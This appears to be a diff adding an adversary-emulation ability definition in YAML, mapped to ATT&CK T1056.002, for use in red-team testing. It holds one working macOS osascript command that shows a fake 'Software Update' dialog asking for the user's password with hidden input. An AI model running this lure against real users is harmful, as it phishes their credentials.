@@ -1,0 +1,22 @@
+---
+- id: e3d4f78fc9dac33343b2f0865a8f8d45
+  name: AppleScript - Prompt User for Password
+  description: 'Prompt User for Password (Local Phishing)
+
+    Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1056.002
+    name: 'Input Capture: GUI Input Capture'
+  platforms:
+    darwin:
+      sh:
+        command: osascript -e 'tell app "System Preferences" to activate' -e 'tell
+          app "System Preferences" to activate' -e 'tell app "System Preferences"
+          to display dialog "Software Update requires that you type your password
+          to apply changes." & return & return  default answer "" with icon 1 with
+          hidden answer with title "Software Update"'
+        payloads: []
+        cleanup: ''
